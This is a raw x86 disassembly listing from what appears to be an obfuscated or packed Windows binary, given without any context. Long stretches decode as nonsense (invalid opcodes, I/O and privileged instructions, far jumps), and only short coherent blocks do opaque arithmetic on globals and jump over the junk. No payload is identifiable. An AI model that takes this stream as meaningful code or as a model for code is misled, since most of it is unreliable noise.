  406132:	mov    edx,0x72b2a607
  406137:	push   ebx
  406138:	add    eax,0x22bfb53c
  40613d:	dec    esi
  40613e:	mov    al,ds:0x3659cb06
  406143:	xor    bl,BYTE PTR [ebx]
  406145:	mov    esi,0x64f9a305
  40614a:	test   al,0xf0
  40614c:	ins    BYTE PTR es:[edi],dx
  40614d:	jge    0x4060f3
  40614f:	fwait
  406150:	mov    ch,0x9
  406152:	add    al,0x76
  406154:	aas    
  406155:	mov    al,0xa7
  406157:	inc    ebx
  406158:	dec    eax
  406159:	xchg   edx,eax
  40615a:	cmp    DWORD PTR [bp+si],esp
  40615d:	mov    edi,0x567d0ee9
  406162:	adc    eax,0x978d2ad5
  406167:	jmp    0xe05f:0x5e6c10de
  40616e:	loope  0x40615b
  406170:	rcr    BYTE PTR [esi+esi*4-0x2c],1
  406174:	clc    
  406175:	jo     0x40611f
  406177:	dec    esi
  406178:	mov    ebp,0x6c23c17f
  40617d:	push   cs
  40617e:	jg     0x40616b
  406180:	ret    0x3fc2
  406183:	sbb    eax,0xbcbefe5c
  406188:	or     DWORD PTR ds:[ecx+0x406f1cbc],esp
  40618f:	dec    ebx
  406190:	rcr    DWORD PTR [eax],1
  406192:	xor    BYTE PTR [eax-0x11fd7cce],ch
  406198:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406199:	inc    esi
  40619a:	aad    0xc1
  40619c:	adc    DWORD PTR es:[edx],ebp
  40619f:	inc    eax
  4061a0:	mov    edx,0xd9bac80f
  4061a5:	xor    dl,ah
  4061a7:	jb     0x40620c
  4061a9:	sti    
  4061aa:	pop    ebp
  4061ab:	outs   dx,BYTE PTR ds:[esi]
  4061ac:	and    al,0x81
  4061ae:	data16 mov ds:0xc682e4fa,al
  4061b4:	mov    ecx,0xfff3260c
  4061b9:	fcomp  QWORD PTR [edx]
  4061bb:	mov    edx,0xf632be8e
  4061c0:	int    0xa3
  4061c2:	popa   
  4061c3:	pop    ss
  4061c4:	mov    WORD PTR [eax-0x109259e2],?
  4061ca:	lds    ebp,FWORD PTR [ebx]
  4061cc:	adc    al,0x37
  4061ce:	leave  
  4061cf:	mov    ds:0x1740c8fc,al
  4061d4:	out    dx,eax
  4061d5:	not    DWORD PTR ds:0x12a5c6b4
  4061db:	hlt    
  4061dc:	lock cld 
  4061de:	lods   eax,DWORD PTR ds:[esi]
  4061df:	lahf   
  4061e0:	dec    edi
  4061e1:	mov    eax,0xab8a334f
  4061e6:	call   0xcd6082c8
  4061eb:	std    
  4061ec:	cli    
  4061ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4061ee:	jg     0x406261
  4061f0:	ror    BYTE PTR [eax+0x32],0x7f
  4061f4:	cdq    
  4061f5:	out    dx,al
  4061f6:	dec    edx
  4061f7:	push   ebp
  4061f8:	xchg   ecx,eax
  4061f9:	dec    ebx
  4061fa:	pop    ebx
  4061fb:	mov    ah,BYTE PTR [edi+0x3ab761b2]
  406201:	in     al,0x0
  406203:	cld    
  406204:	(bad)  
  406205:	push   0x49fa808e
  40620a:	repnz and al,0xc7
  40620d:	test   eax,0x54cee76
  406212:	add    edi,ebx
  406214:	cdq    
  406215:	retf   0xe236
  406218:	xchg   ebp,eax
  406219:	mov    ebp,0xa03980e
  40621e:	int3   
  40621f:	mov    ds:0xf9847a21,al
  406224:	pop    ebx
  406225:	leave  
  406226:	stos   BYTE PTR es:[edi],al
  406227:	cmp    ebp,ecx
  406229:	ror    DWORD PTR [ecx+esi*1],1
  40622c:	loope  0x40624a
  40622e:	outs   dx,BYTE PTR ds:[esi]
  40622f:	lds    esp,FWORD PTR [eax]
  406231:	pop    edi
  406232:	mov    bh,0xe7
  406234:	sbb    ah,BYTE PTR [ecx+0x59]
  406237:	mov    eax,ds:0xcaf28eda
  40623c:	fdiv   DWORD PTR [ebx]
  40623e:	mov    esp,0x9800626c
  406243:	gs jmp 0x9356:0x7d5e136a
  40624b:	cmp    esp,DWORD PTR [edx-0x7b]
  40624e:	pop    edx
  40624f:	loope  0x40628a
  406251:	test   al,0xba
  406253:	rol    BYTE PTR [ebx-0x9],1
  406256:	retf   0x8d93
  406259:	xchg   esi,eax
  40625a:	cli    
  40625b:	inc    ebp
  40625c:	pop    ebp
  40625d:	mov    dh,0xa5
  40625f:	int    0xb5
  406261:	test   al,0xcc
  406263:	cmc    
  406264:	mov    ecx,0x28476342
  406269:	sar    bh,1
  40626b:	mov    eax,ds:0xfb48fd59
  406270:	out    dx,al
  406271:	lods   eax,DWORD PTR ds:[esi]
  406272:	mov    ah,0xca
  406274:	in     eax,0x97
  406276:	jns    0x406238
  406278:	dec    eax
  406279:	or     dl,cl
  40627b:	mov    edx,DWORD PTR [edi]
  40627d:	das    
  40627e:	out    dx,al
  40627f:	test   eax,0x8665d0de
  406285:	daa    
  406286:	inc    esp
  406287:	adc    ch,BYTE PTR [ecx]
  406289:	enterw 0x8f73,0xe7
  40628e:	mov    eax,DWORD PTR [ebp+0x18]
  406291:	mov    esi,DWORD PTR [ebp+0x10]
  406294:	sub    DWORD PTR ds:0x42fe09,0x42fe86
  40629e:	mov    DWORD PTR [esi+0xc],eax
  4062a1:	or     DWORD PTR ds:0x42e7f3,ecx
  4062a7:	mov    eax,DWORD PTR [ebp+0x1c]
  4062aa:	mov    DWORD PTR ds:0x42fe72,0x1e
  4062b4:	cmp    DWORD PTR ds:0x42fe72,0x0
  4062bb:	je     0x40630e
  4062c1:	cmp    DWORD PTR ds:0x42fe72,0x7
  4062c8:	jne    0x4062e2
  4062ce:	push   0x4403
  4062d3:	push   DWORD PTR [ebp-0x10]
  4062d6:	push   DWORD PTR [ebp-0x24]
  4062d9:	push   DWORD PTR [ebp-0x10]
  4062dc:	call   DWORD PTR ds:0x42e63b
  4062e2:	cmp    DWORD PTR ds:0x42fe72,0x8
  4062e9:	jne    0x4062fc
  4062ef:	mov    esi,DWORD PTR ds:0x42fe72
  4062f5:	dec    esi
  4062f6:	mov    DWORD PTR ds:0x42fe72,esi
  4062fc:	mov    esi,DWORD PTR ds:0x42fe72
  406302:	dec    esi
  406303:	mov    DWORD PTR ds:0x42fe72,esi
  406309:	jmp    0x4062b4
  40630e:	mov    esi,DWORD PTR [ebp+0x10]
  406311:	mov    DWORD PTR [esi+0x10],eax
  406314:	mov    eax,eax
  406316:	mov    eax,DWORD PTR [ebp+0x8]
  406319:	xor    eax,ecx
  40631b:	add    eax,edx
  40631d:	jmp    0x4064e3
  406322:	jge    0x4063a3
  406324:	gs cli 
  406326:	gs (bad) 
  406329:	sti    
  40632a:	ret    
  40632b:	pusha  
  40632c:	jo     0x4062dd
  40632e:	repnz push ebp
  406330:	jbe    0x40635b
  406332:	mov    WORD PTR [eax+esi*2],?
  406335:	jo     0x4062de
  406337:	jg     0x4063a9
  406339:	jo     0x4062bc
  40633b:	daa    
  40633c:	gs inc esp
  40633e:	inc    edx
  40633f:	cmp    DWORD PTR [esi-0x101acecc],edx
  406345:	mov    dh,0x5
  406347:	gs leave 
  406349:	stc    
  40634a:	xchg   ebx,eax
  40634b:	xchg   ebp,eax
  40634c:	jne    0x406344
  40634e:	ret    
  40634f:	pop    edi
  406350:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406351:	dec    esp
  406352:	or     al,BYTE PTR [esi]
  406354:	add    ch,BYTE PTR [ecx]
  406356:	sub    eax,DWORD PTR [edx+0x63]
  406359:	es sub al,0x82
  40635c:	lock cdq 
  40635e:	jb     0x4063c9
  406360:	(bad)  
  406361:	mov    dh,0xf0
  406363:	scas   al,BYTE PTR es:[edi]
  406364:	jns    0x406384
  406366:	ds (bad) 
  406368:	scas   eax,DWORD PTR es:[edi]
  406369:	shl    edi,cl
  40636b:	cmp    cl,BYTE PTR [ebp+0x47]
  40636e:	push   esp
  40636f:	test   eax,0x1659368f
  406374:	sub    BYTE PTR [edx+0x4b],0xcf
  406378:	xor    al,0xe6
  40637a:	jmp    0x406381
  40637c:	(bad)  
  40637d:	frstor [ecx+0x26]
  406380:	cli    
  406381:	pop    ebp
  406382:	mov    al,0x2f
  406384:	js     0x4063c5
  406386:	jne    0x40639f
  406388:	ins    DWORD PTR es:[edi],dx
  406389:	pushf  
  40638a:	push   ebp
  40638b:	shl    DWORD PTR [eax+0x6d],1
  40638e:	cmp    al,0x1d
  406390:	cmp    cl,BYTE PTR [ebx-0x7a]
  406393:	jne    0x406351
  406395:	clc    
  406396:	div    BYTE PTR [ebp-0x67]
  406399:	(bad)  
  40639a:	in     al,0x16
  40639c:	stc    
  40639d:	ins    DWORD PTR es:[edi],dx
  40639e:	push   cs
  40639f:	jecxz  0x406418
  4063a1:	outs   dx,DWORD PTR ds:[esi]
  4063a2:	call   0x487704cc
  4063a7:	xchg   BYTE PTR [ebx],dl
  4063a9:	dec    ecx
  4063aa:	adc    eax,0xfd2cb129
  4063af:	cmp    al,BYTE PTR [edx+edx*4]
  4063b2:	out    0xb4,al
  4063b4:	sti    
  4063b5:	in     al,0xd1
  4063b7:	test   eax,0x92d506c5
  4063bc:	xchg   BYTE PTR [ebp+0x53a0cf7e],dh
  4063c2:	mov    eax,ds:0xe3df5e0e
  4063c7:	xchg   esp,eax
  4063c8:	sub    esp,esi
  4063ca:	inc    esi
  4063cb:	(bad)  
  4063cc:	out    dx,eax
  4063cd:	or     cl,BYTE PTR [ebx+ebp*1]
  4063d0:	xor    DWORD PTR ds:[ecx+0x5a],edx
  4063d4:	into   
  4063d5:	dec    edi
  4063d6:	bswap  esi
  4063d8:	(bad)  
  4063d9:	mov    eax,0x158d9c32
  4063de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063df:	jae    0x4063fa
  4063e1:	das    
  4063e2:	out    0x14,eax
  4063e4:	fnstcw WORD PTR [ebx+eiz*8-0x1851093a]
  4063eb:	push   esp
  4063ec:	fs cmp eax,0x9d2c611d
  4063f2:	inc    edi
  4063f3:	xchg   edx,eax
  4063f4:	push   edx
  4063f5:	int    0x8a
  4063f7:	sub    BYTE PTR [esi],ah
  4063f9:	out    dx,al
  4063fa:	cld    
  4063fb:	mov    ?,ebp
  4063fd:	sbb    DWORD PTR [ecx-0x6a],ecx
  406400:	xor    BYTE PTR [eax],0x6f
  406403:	lea    esp,[eax]
  406405:	in     al,0x91
  406407:	add    DWORD PTR [ebp+0x48],ecx
  40640a:	add    al,0xde
  40640c:	mov    ebp,0x29f64a6
  406411:	fild   DWORD PTR [edi]
  406413:	scas   al,BYTE PTR es:[edi]
  406414:	jp     0x40646e
  406416:	and    al,0x0
  406418:	dec    edx
  406419:	mov    ds:0x45c0a967,eax
  40641e:	inc    eax
  40641f:	mov    ch,dl
  406421:	popa   
  406422:	clc    
  406423:	add    DWORD PTR [edi+0x43ec2a50],ebx
  406429:	adc    eax,esi
  40642b:	pop    ds
  40642c:	or     eax,0x9776933c
  406431:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406432:	mov    dl,0xf7
  406434:	inc    ecx
  406435:	adc    eax,0x23269742
  40643a:	retf   0xb40f
  40643d:	cmp    edx,eax
  40643f:	mov    ecx,0xbb283dcd
  406444:	ja     0x406436
  406446:	hlt    
  406447:	pop    ds
  406448:	xchg   esi,eax
  406449:	jecxz  0x40646e
  40644b:	mov    ds:0x6ea7465c,eax
  406450:	xchg   BYTE PTR [ecx],al
  406452:	push   ecx
  406453:	and    ch,BYTE PTR [esi-0x4f]
  406456:	aaa    
  406457:	mov    DWORD PTR ds:0xf58382f2,0x57333bed
  406461:	std    
  406462:	retf   
  406463:	adc    BYTE PTR [ecx+0x752e482c],0xd5
  40646a:	push   ds
  40646b:	out    dx,al
  40646c:	add    DWORD PTR [eax],ebp
  40646e:	sbb    BYTE PTR ds:0xec183141,ah
  406474:	cmp    ebp,edx
  406476:	mov    BYTE PTR [eiz*1-0x3064fc3],bh
  40647d:	(bad)  
  40647e:	and    dh,BYTE PTR [ecx]
  406480:	push   ss
  406481:	jmp    0x888b02fe
  406486:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406487:	push   ecx
  406488:	arpl   sp,sp
  40648a:	mov    ebx,0x1fdb41f1
  40648f:	or     BYTE PTR [ecx-0x5f],dl
  406492:	mov    al,0xb2
  406494:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  406496:	mov    ds:0x336620af,al
  40649b:	mov    dl,0xbd
  40649d:	cmc    
  40649e:	in     al,dx
  40649f:	xchg   ecx,eax
  4064a0:	scas   al,BYTE PTR es:[edi]
  4064a1:	into   
  4064a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4064a3:	add    eax,0xdd8521e6
  4064a8:	cmp    al,0xce
  4064aa:	jge    0x40644a
  4064ac:	xchg   ecx,eax
  4064ad:	jmp    0x75e4:0x42cd2916
  4064b4:	mov    edx,0x43e3e4e4
  4064b9:	cmp    BYTE PTR [ebx+0x20],ch
  4064bc:	or     BYTE PTR [ecx],dh
  4064be:	inc    ebx
  4064bf:	push   edx
  4064c0:	loop   0x4064b6
  4064c2:	sti    
  4064c3:	and    BYTE PTR [ebp+eax*8-0x3d],al
  4064c7:	shr    BYTE PTR [eax],cl
  4064c9:	dec    eax
  4064ca:	mov    ss,WORD PTR [edi]
  4064cc:	push   ebp
  4064cd:	xchg   esp,eax
  4064ce:	dec    ebp
  4064cf:	dec    ebp
  4064d0:	pop    edx
  4064d1:	mov    ebx,DWORD PTR [esi+edi*2-0x209bced2]
  4064d8:	loop   0x4064db
  4064da:	sub    eax,DWORD PTR [edi+0x5c]
  4064dd:	sub    DWORD PTR [ecx],edi
  4064df:	push   esi
  4064e0:	(bad)  
  4064e1:	ret    
  4064e2:	sbb    DWORD PTR [esi-0x37],0xffffffc2
  4064e6:	sbb    BYTE PTR [eax],al
  4064e8:	push   ebp
  4064e9:	mov    ebp,esp
  4064eb:	mov    eax,DWORD PTR [ebp+0xc]
  4064ee:	xor    edx,edx
  4064f0:	mov    ecx,0x7264fca9
  4064f5:	div    ecx
  4064f7:	mov    ecx,DWORD PTR [ebp+0x10]
  4064fa:	and    ecx,eax
  4064fc:	or     ecx,0x81161d8f
  406502:	mov    eax,ecx
  406504:	pop    ebp
  406505:	ret    0x18
  406508:	push   ebp
  406509:	mov    ebp,esp
  40650b:	push   ecx
  40650c:	adc    DWORD PTR ds:0x42fe76,edi
  406512:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  406519:	mov    eax,DWORD PTR [ebp-0x4]
  40651c:	sbb    ecx,DWORD PTR ds:0x42fdf9
  406522:	mov    edx,DWORD PTR [ebp+0x10]
  406525:	mov    ecx,0x7510855
  40652a:	xor    eax,ecx
  40652c:	add    eax,0x32729c
  406531:	mov    DWORD PTR [edx],eax
  406533:	sub    DWORD PTR ds:0x42fe72,edi
  406539:	mov    eax,DWORD PTR [ebp+0x14]
  40653c:	sub    DWORD PTR ds:0x42fe72,ecx
  406542:	mov    edx,DWORD PTR [ebp+0x10]
  406545:	and    DWORD PTR ds:0x42fdd9,0x42e7fb
  40654f:	mov    DWORD PTR [edx+0x4],eax
  406552:	mov    eax,DWORD PTR [ebp+0x18]
  406555:	jmp    0x4067e0
  40655a:	mov    ss,edx
  40655c:	jg     0x40659a
  40655e:	inc    ebx
  40655f:	ror    DWORD PTR [ecx+0x52],1
  406562:	jae    0x4065d2
  406564:	pop    edx
  406565:	dec    ecx
  406566:	ja     0x406560
  406568:	fdiv   QWORD PTR [bp+di]
  40656b:	cmp    dh,BYTE PTR [eax+0x70]
  40656e:	loop   0x4065ee
  406570:	jo     0x4065e2
  406572:	mov    edx,0xe2a0e919
  406577:	(bad)  
  406578:	jp     0x40657a
  40657a:	push   ecx
  40657b:	or     DWORD PTR [ebx],ecx
  40657d:	dec    edi
  40657e:	imul   ebx,eax,0xffffffa8
  406581:	add    esp,DWORD PTR [eax+esi*2+0x11952028]
  406588:	sbb    ecx,DWORD PTR [ebx]
  40658a:	mov    DWORD PTR [eax+0x2e],0xb4d8d85c
  406591:	xor    al,0xb6
  406593:	ins    BYTE PTR es:[edi],dx
  406594:	lods   eax,DWORD PTR ds:[esi]
  406595:	test   BYTE PTR [ecx+edi*2-0x5a4a9f4f],bl
  40659c:	pop    esi
  40659d:	jnp    0x406592
  40659f:	add    eax,0x461ebee1
  4065a4:	add    eax,0x624dc1be
  4065a9:	mov    dl,0xc0
  4065ab:	mov    cl,BYTE PTR [ecx+0x19858942]
  4065b1:	sub    DWORD PTR [edx+0x12f557f0],ebp
  4065b7:	xor    eax,0xee4f947c
  4065bc:	or     ebp,DWORD PTR ds:0x7ec3dda9
  4065c2:	mov    ds:0xa98466da,al
  4065c7:	bound  ecx,QWORD PTR [ebx-0x37efa426]
  4065cd:	fwait
  4065ce:	stc    
  4065cf:	sbb    al,0xb7
  4065d1:	jmp    0x5374:0xb40b2a4e
  4065d8:	jnp    0x406626
  4065da:	xor    BYTE PTR [edx+0x2b],al
  4065dd:	xchg   esi,eax
  4065de:	in     eax,dx
  4065df:	out    0xee,al
  4065e1:	popf   
  4065e2:	mov    edi,0xd769c63e
  4065e7:	test   al,0xf4
  4065e9:	cli    
  4065ea:	push   ss
  4065eb:	icebp  
  4065ec:	scas   eax,DWORD PTR es:[edi]
  4065ed:	sub    DWORD PTR [esi-0x16],edx
  4065f0:	jmp    0x4065da
  4065f2:	add    BYTE PTR [esi-0x36e7d266],cl
  4065f8:	cmp    al,0xea
  4065fa:	dec    esp
  4065fb:	xor    cl,al
  4065fd:	mov    ebp,DWORD PTR [edx-0x3cf71f8d]
  406603:	adc    BYTE PTR [eax-0x9],ch
  406606:	dec    edx
  406607:	stc    
  406608:	sub    al,0x16
  40660a:	xchg   ebp,eax
  40660b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40660c:	xor    BYTE PTR [ecx+0x4201c3ae],cl
  406612:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406613:	popf   
  406614:	jb     0x4065ce
  406616:	push   ebx
  406617:	fimul  DWORD PTR [ecx+0x16]
  40661a:	clc    
  40661b:	out    0x11,al
  40661d:	add    eax,DWORD PTR [edi]
  40661f:	ss xchg edx,eax
  406621:	jle    0x40660c
  406623:	aam    0x2
  406625:	les    esi,FWORD PTR cs:[ebx-0x67]
  406629:	mov    ch,0xec
  40662b:	add    bl,dh
  40662d:	jno    0x4065f7
  40662f:	mov    ah,0xc1
  406631:	loope  0x4065b8
  406633:	inc    esi
  406634:	mov    ah,0x8a
  406636:	ret    0x6a25
  406639:	std    
  40663a:	xor    ah,BYTE PTR [edx+0x7c]
  40663d:	or     BYTE PTR [ebx-0x33],ch
  406640:	sbb    eax,ecx
  406642:	jno    0x406610
  406644:	adc    al,0xce
  406646:	pop    ecx
  406647:	leave  
  406648:	test   al,0x27
  40664a:	mov    cs,ebp
  40664c:	xlat   BYTE PTR ds:[ebx]
  40664d:	mov    bh,0x69
  40664f:	sbb    al,0xff
  406652:	push   cs
  406653:	pop    ecx
  406654:	mov    esp,esp
  406656:	pusha  
  406657:	adc    eax,0x6c545a9b
  40665c:	inc    edx
  40665d:	xchg   edx,eax
  40665e:	or     esi,edi
  406660:	mov    DWORD PTR [ecx-0xb7b5e20],ebx
  406666:	push   cs
  406667:	jg     0x4065f3
  406669:	pop    ebx
  40666a:	mov    ah,0xa9
  40666c:	add    eax,0xe227b78e
  406671:	sub    ebx,DWORD PTR [edx+eiz*8]
  406674:	adc    bl,BYTE PTR [edx+0x69]
  406677:	dec    esp
  406678:	jo     0x406656
  40667a:	cmp    al,0xe4
  40667c:	ret    0xff15
  40667f:	and    BYTE PTR [ecx-0x164ed37a],bh
  406685:	ffree  st(6)
  406687:	stos   DWORD PTR es:[edi],eax
  406688:	aad    0xcf
  40668a:	into   
  40668b:	xchg   ebx,eax
  40668c:	mov    ecx,0x8c926ea8
  406691:	pop    ds
  406692:	push   dx
  406694:	stos   BYTE PTR es:[edi],al
  406695:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406696:	das    
  406697:	test   eax,0x38323f3
  40669c:	sbb    eax,0x2c3a2994
  4066a1:	icebp  
  4066a2:	ficomp DWORD PTR [esi+0x42]
  4066a5:	rol    DWORD PTR [ebp+0x34006e8],1
  4066ab:	outs   dx,DWORD PTR ds:[esi]
  4066ac:	imul   ecx,DWORD PTR [ecx-0x793ec95b],0x66
  4066b3:	test   BYTE PTR [edx],dh
  4066b5:	stos   BYTE PTR es:[edi],al
  4066b6:	xchg   esi,eax
  4066b7:	jg     0x40663e
  4066b9:	adc    BYTE PTR [edi],dl
  4066bb:	push   ebx
  4066bc:	loope  0x4066f8
  4066be:	lahf   
  4066bf:	push   edi
  4066c0:	inc    esi
  4066c1:	mov    edi,0xf0038877
  4066c6:	jge    0x406659
  4066c8:	xchg   BYTE PTR [ebp+0xd1d5f95],dh
  4066ce:	pop    es
  4066cf:	cmp    DWORD PTR [esi-0x10],esp
  4066d2:	fcmovnbe st,st(0)
  4066d4:	mov    dh,0xcc
  4066d6:	ret    0x56fe
  4066d9:	sbb    eax,0x253d510c
  4066de:	add    al,0xa1
  4066e0:	add    al,0xbd
  4066e2:	fisttp DWORD PTR [ecx]
  4066e4:	pop    ss
  4066e5:	jns    0x40666f
  4066e7:	pop    ecx
  4066e8:	rcl    BYTE PTR [eax-0x5ab41507],0x74
  4066ef:	cmp    ch,ah
  4066f1:	bound  eax,QWORD PTR [esi+0x1c0c1b1b]
  4066f7:	cmp    edx,DWORD PTR [edx-0x2bdb0ff7]
  4066fd:	retf   0xa918
  406700:	xor    DWORD PTR [esi-0x5d],eax
  406703:	push   ss
  406704:	leave  
  406705:	dec    ebp
  406706:	je     0x4066a0
  406708:	loop   0x4066da
  40670a:	mov    cs,eax
  40670c:	pop    es
  40670d:	aas    
  40670e:	sub    DWORD PTR [eax+0x65],edx
  406711:	jo     0x406721
  406713:	neg    BYTE PTR [eax]
  406715:	arpl   WORD PTR [ebx],ax
  406717:	sub    BYTE PTR [eax],0x9e
  40671a:	inc    eax
  40671b:	add    eax,0x9802ee2c
  406720:	or     ebp,DWORD PTR [edi+0x6d]
  406723:	faddp  st(5),st
  406725:	loop   0x406727
  406727:	and    al,0xa9
  406729:	cmp    edx,DWORD PTR [eax-0x14]
  40672c:	mov    esi,0xba9e2c4a
  406731:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406732:	jb     0x4066b5
  406734:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406735:	and    eax,0x4200c146
  40673a:	icebp  
  40673b:	test   eax,ebp
  40673d:	call   0xfb81f5ef
  406742:	sbb    dh,BYTE PTR [edi+ebp*8-0x56]
  406746:	in     eax,0x66
  406748:	mov    ah,BYTE PTR [edx+0x32]
  40674b:	add    ah,dl
  40674d:	test   BYTE PTR [ebp-0x587ec671],dh
  406753:	shr    BYTE PTR [edx-0x59757fab],cl
  406759:	push   edi
  40675a:	inc    ebp
  40675b:	jns    0x40677c
  40675d:	xchg   ebx,eax
  40675e:	xor    ah,BYTE PTR [ebx]
  406760:	mov    eax,ds:0xc47d727b
  406765:	fs inc di
  406768:	add    bl,BYTE PTR es:[ecx-0x49]
  40676c:	xchg   ebx,eax
  40676d:	aam    0x8d
  40676f:	rcr    DWORD PTR [edx-0x5bc326bd],0x7
  406776:	push   es
  406777:	out    0x22,al
  406779:	jmp    0xc4ef:0xf6e8c742
  406780:	and    al,0xfd
  406782:	(bad)  
  406783:	cmp    bh,BYTE PTR [ecx-0x1a]
  406786:	adc    BYTE PTR [esi-0x726ae750],dl
  40678c:	lahf   
  40678d:	sub    eax,DWORD PTR [ebx]
  40678f:	rol    BYTE PTR [esi-0x4e6ea14],cl
  406795:	mov    edx,0x814ec65c
  40679a:	mov    ds:0x3f69cb52,eax
  40679f:	xor    BYTE PTR [ebx-0x1ae711c3],dh
  4067a5:	xor    dh,BYTE PTR [edi+eax*8+0x545977d0]
  4067ac:	add    al,BYTE PTR ds:0x47d4cf0f
  4067b2:	ss add al,0x7a
  4067b6:	jge    0x4067c9
  4067b8:	sbb    eax,0xc2a5345d
  4067bd:	pushf  
  4067be:	dec    edi
  4067bf:	sub    ecx,DWORD PTR [ebx]
  4067c1:	fst    st(6)
  4067c3:	sub    eax,0x144fcb35
  4067c8:	inc    ecx
  4067c9:	cs jnp 0x40682a
  4067cc:	out    0xc5,eax
  4067ce:	mov    esp,0xd7015e1f
  4067d3:	add    eax,0x98a94f9
  4067d8:	mov    eax,ds:0x6aa8bfd3
  4067dd:	ret    0xd670
  4067e0:	mov    edx,DWORD PTR [ebp+0x10]
  4067e3:	mov    DWORD PTR [edx+0x8],eax
  4067e6:	xor    eax,edx
  4067e8:	mov    eax,DWORD PTR [ebp+0x1c]
  4067eb:	mov    edx,DWORD PTR [ebp+0x10]
  4067ee:	adc    DWORD PTR ds:0x42fdd5,0x1a3e
  4067f8:	mov    DWORD PTR [edx+0xc],eax
  4067fb:	mov    eax,DWORD PTR [ebp+0x20]
  4067fe:	or     DWORD PTR ds:0x42e220,0x7513
  406808:	mov    edx,DWORD PTR [ebp+0x10]
  40680b:	sub    DWORD PTR ds:0x42e7fb,0x76c6
  406815:	mov    DWORD PTR [edx+0x10],eax
  406818:	and    DWORD PTR ds:0x42fde5,0x42e813
  406822:	mov    eax,eax
  406824:	mov    eax,DWORD PTR [ebp+0x14]
  406827:	test   eax,eax
  406829:	mov    eax,DWORD PTR [ebp+0x8]
  40682c:	jne    0x406ac0
  406832:	mov    eax,DWORD PTR [ebp+0xc]
  406835:	jmp    0x406ac0
  40683a:	sub    DWORD PTR ds:0x49e98909,edi
  406840:	test   eax,0xf5555d5d
  406845:	pushf  
  406846:	pop    ecx
  406847:	rcr    BYTE PTR [eax],0xf7
  40684a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40684b:	cmp    BYTE PTR [eax+0x70],dh
  40684e:	loop   0x4068ce
  406850:	jo     0x4068c2
  406852:	mov    ecx,0xa4fa19ba
  406857:	xor    BYTE PTR [ebx-0x54],ah
  40685a:	(bad)  
  40685c:	retf   0x3b47
  40685f:	jecxz  0x4068cf
  406861:	sub    BYTE PTR [ecx],ch
  406863:	(bad)
  406866:	std    
  406867:	test   eax,0x702d3394
  40686c:	push   edx
  40686d:	mov    bh,0x81
  40686f:	jne    0x4068a0
  406871:	mov    WORD PTR ds:0x421b522d,gs
  406877:	fs mov cl,cl
  40687a:	hlt    
  40687b:	push   edx
  40687c:	sbb    DWORD PTR [ebp+0x7b4b3b56],esp
  406882:	mov    ah,0x2e
  406884:	pop    esi
  406885:	cmp    eax,DWORD PTR cs:[ebx-0x2e]
  406889:	pushf  
  40688a:	lock stos DWORD PTR es:[edi],eax
  40688c:	jge    0x406860
  40688e:	fnstcw WORD PTR [ebx-0x22]
  406891:	xor    eax,0xc25346de
  406896:	jge    0x40688a
  406898:	xor    edx,DWORD PTR [eax+0x12]
  40689b:	and    al,0x7e
  40689d:	daa    
  40689e:	aas    
  40689f:	and    esi,ebx
  4068a1:	js     0x406901
  4068a3:	rol    BYTE PTR [edx-0x79],0xf9
  4068a7:	pop    ss
  4068a8:	add    ah,bl
  4068aa:	cwde   
  4068ab:	mov    edx,0xce94914c
  4068b0:	loopne 0x40686e
  4068b2:	jp     0x4068a1
  4068b4:	pop    edi
  4068b5:	push   cs
  4068b6:	fs push ecx
  4068b8:	cmp    eax,0x8faf5873
  4068bd:	data16 add cl,bl
  4068c0:	call   0xe97caef
  4068c5:	inc    edi
  4068c6:	xchg   ecx,eax
  4068c7:	pop    esp
  4068c8:	je     0x4068c0
  4068ca:	and    al,0x7
  4068cc:	mov    eax,ds:0xb27254c7
  4068d1:	mov    esi,0xf1b4f020
  4068d6:	push   esp
  4068d7:	cs and al,0x10
  4068da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4068db:	loopne 0x4068de
  4068dd:	nop
  4068de:	push   DWORD PTR [ebx]
  4068e0:	jb     0x4068ad
  4068e2:	mov    edx,0x4737a581
  4068e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4068e8:	js     0x40695c
  4068ea:	mov    edi,0xca35a706
  4068ef:	data16 jns 0x40695e
  4068f2:	in     al,dx
  4068f3:	test   BYTE PTR [ecx],bh
  4068f5:	jns    0x4068eb
  4068f7:	cdq    
  4068f8:	scas   eax,DWORD PTR es:[edi]
  4068f9:	mov    al,ds:0x8b47d506
  4068fe:	lds    esi,FWORD PTR [ebx]
  406900:	or     ebx,ebp
  406902:	mov    eax,ds:0xbfeb3f91
  406907:	push   0x3b3ba646
  40690c:	loop   0x4068ec
  40690e:	sbb    eax,0x7c1c587
  406913:	xor    BYTE PTR [eax+ebx*2+0x63b495c0],ch
  40691a:	sbb    BYTE PTR [ebx-0x12],bl
  40691d:	mov    es,WORD PTR [eax+0x39a7e789]
  406923:	or     esp,DWORD PTR [ebx]
  406925:	fsubr  QWORD PTR [ecx+0x42828cc7]
  40692b:	jb     0x4068b2
  40692d:	mov    ds:0xbcf7dc17,al
  406932:	retf   
  406933:	scas   al,BYTE PTR es:[edi]
  406934:	adc    al,0x7b
  406936:	mul    eax
  406938:	inc    ecx
  406939:	addr16 jnp 0x4068e1
  40693c:	push   edi
  40693d:	test   eax,0xa5591c86
  406942:	or     DWORD PTR [ebp+ecx*8-0x45],0x2003a6bf
  40694a:	repz shl BYTE PTR [esi+0x70ec9fb8],0x3c
  406952:	popf   
  406953:	lea    eax,[esi]
  406955:	shl    BYTE PTR [edx+0x2a08eff8],0xc
  40695c:	cmp    eax,0xb7f4ab6e
  406961:	in     eax,dx
  406962:	sbb    eax,0x274b9643
  406967:	adc    eax,0x669b5ec8
  40696c:	fsub   QWORD PTR [ecx+0x4a]
